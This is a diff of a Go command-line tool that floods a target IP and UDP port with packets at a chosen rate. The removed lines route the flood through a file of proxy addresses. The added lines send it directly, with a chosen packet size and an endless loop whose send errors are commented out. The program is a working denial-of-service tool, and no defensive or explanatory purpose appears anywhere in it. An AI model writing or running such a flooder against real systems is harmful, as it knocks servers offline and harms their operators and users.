@@ -1,20 +1,18 @@
 package main
 
 import (
- "bufio"
  "encoding/hex"
  "fmt"
  "net"
  "os"
  "strconv"
- "strings"
  "time"
 )
 
 func main() {
  // Check command-line arguments
  if len(os.Args) < 6 {
-  fmt.Println("Usage: go run main.go <IP> <UDP Port> <Packets per Second> <UDP Payload Hex> <Proxy File>")
+  fmt.Println("Usage: go run main.go <IP> <UDP Port> <Packets per Second> <UDP Payload Hex> <Packet Size>")
   return
  }
 
@@ -27,101 +25,52 @@ func main() {
   return
  }
  udpPayloadHex := os.Args[4]
- proxyFile := os.Args[5]
-
- // Read the proxy file
- proxyList, err := readProxyList(proxyFile)
+ packetSize, err := strconv.Atoi(os.Args[5])
  if err != nil {
-  fmt.Println("Failed to read proxy file:", err)
+  fmt.Println("Invalid value for Packet Size:", err)
   return
  }
 
- // Send payload over UDP using SOCKS5 proxies
- for _, proxy := range proxyList {
-  proxyAddr, err := net.ResolveTCPAddr("tcp", proxy)
-  if err != nil {
-   fmt.Println("Failed to resolve proxy address:", err)
-   continue
-  }
-
-  // Connect to the proxy
-  proxyConn, err := net.DialTCP("tcp", nil, proxyAddr)
-  if err != nil {
-   fmt.Println("Failed to connect to proxy:", err)
-   continue
-  }
-
-  fmt.Println("Connected to proxy:", proxyConn.RemoteAddr())
-
-  // Send payload over UDP through the proxy
-  udpAddr, err := net.ResolveUDPAddr("udp", ip+":"+udpPort)
-  if err != nil {
-   fmt.Println("Failed to resolve UDP address:", err)
-   continue
-  }
-
-  udpConn, err := net.DialUDP("udp", nil, udpAddr)
-  if err != nil {
-   fmt.Println("Failed to connect to UDP server:", err)
-   continue
-  }
-  defer udpConn.Close()
-
-  // Decode UDP payload from hexadecimal string
-  udpPayload, err := hex.DecodeString(udpPayloadHex)
-  if err != nil {
-   fmt.Println("Failed to decode UDP payload hex string:", err)
-   continue
-  }
-
-  // Calculate delay between payloads
-  delay := time.Second / time.Duration(packetsPerSecond)
-
-  // Start flooding through the proxy
-  fmt.Printf("Flooding UDP server via proxy %s with %d packets per second\n", proxy, packetsPerSecond)
-  for {
-   // Send payload through the proxy
-   _, err = proxyConn.Write(udpPayload)
-   if err != nil {
-    fmt.Println("Failed to send payload through proxy:", err)
-    break
-   }
-
-   // Check if TCP connection is still open
-   err = proxyConn.SetReadDeadline(time.Now())
-   if err != nil {
-    fmt.Println("Proxy connection closed:", err)
-    break
-   }
-
-   time.Sleep(delay)
-  }
-
-  proxyConn.Close()
- }
-}
-
-// Function to read proxy list from a file
-func readProxyList(filename string) ([]string, error) {
- file, err := os.Open(filename)
+ // Send payload over UDP
+ udpAddr, err := net.ResolveUDPAddr("udp", ip+":"+udpPort)
  if err != nil {
-  return nil, err
+  fmt.Println("Failed to resolve UDP address:", err)
+  return
  }
- defer file.Close()
 
- scanner := bufio.NewScanner(file)
- proxyList := []string{}
+ udpConn, err := net.DialUDP("udp", nil, udpAddr)
+ if err != nil {
+  fmt.Println("Failed to connect to UDP server:", err)
+  return
+ }
+ defer udpConn.Close()
 
- for scanner.Scan() {
-  proxy := strings.TrimSpace(scanner.Text())
-  if proxy != "" {
-   proxyList = append(proxyList, proxy)
+ fmt.Println("Connected to UDP server")
+
+ // Decode UDP payload from hexadecimal string
+ udpPayload, err := hex.DecodeString(udpPayloadHex)
+ if err != nil {
+  fmt.Println("Failed to decode UDP payload hex string:", err)
+  return
+ }
+
+ // Prepare packet with desired size
+ packet := make([]byte, packetSize)
+ copy(packet, udpPayload)
+
+ // Calculate delay between packets
+ delay := time.Second / time.Duration(packetsPerSecond)
+
+ // Start flooding
+ fmt.Printf("Flooding UDP server with %d packets per second\n", packetsPerSecond)
+ for {
+  // Send packet
+  _, err = udpConn.Write(packet)
+  if err != nil {
+   //fmt.Println("Failed to send packet:", err)
+   //return
   }
- }
 
- if err := scanner.Err(); err != nil {
-  return nil, err
+  time.Sleep(delay)
  }
-
- return proxyList, nil
 }
